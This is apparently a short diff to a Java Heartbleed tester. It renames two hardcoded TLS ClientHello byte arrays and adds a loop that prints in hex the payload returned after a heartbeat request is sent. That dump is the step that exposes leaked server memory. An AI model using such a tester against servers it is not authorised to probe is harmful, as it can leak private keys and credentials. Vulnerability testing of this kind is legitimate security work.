@@ -15,7 +15,7 @@ public class Heartbleed_tester {
 		 	this.len = len; 
 		 } 
 	}; 
-	private static byte sslHello_origin[] = new byte[] { 
+	private static byte sslHello[] = new byte[] { 
 		0x16, 0x03, 0x02, 0x00, (byte) 0xdc, // Content type = 16 (handshake message); Version = 03 02; Packet length = 00 dc
 		0x01, 0x00, 0x00, (byte) 0xd8, //Message type = 01 (client hello); Length = 00 00 d8
 		0x03, 0x02, //Client version = 03 02 (TLS 1.1)
@@ -132,7 +132,7 @@ public class Heartbleed_tester {
 		0x01 
 		// Extension
 	}; 
-	private static byte sslHello[] = new byte[] { 
+	private static byte sslHello_origin[] = new byte[] { 
 			0x16, 0x03, 0x02, 0x00, (byte) 0xdc, // Content type = 16 (handshake message); Version = 03 02; Packet length = 00 dc
 			0x01, 0x00, 0x00, (byte) 0xd8, //Message type = 01 (client hello); Length = 00 00 d8
 			0x03, 0x02, //Client version = 03 02 (TLS 1.1)
@@ -219,6 +219,9 @@ public class Heartbleed_tester {
 				out.write(sslHb);
 				SSLPacket pkt = sslReadPacket(din);
 				System.out.println("Type : " + pkt.type + " Ver : " + pkt.ver + " Len : " + pkt.len);
+				for(int i = 0;i<pkt.pay.length;i++){
+					System.out.println(Integer.toHexString(pkt.pay[i]));
+				}
 				switch(pkt.type){
 				case 24:
 					
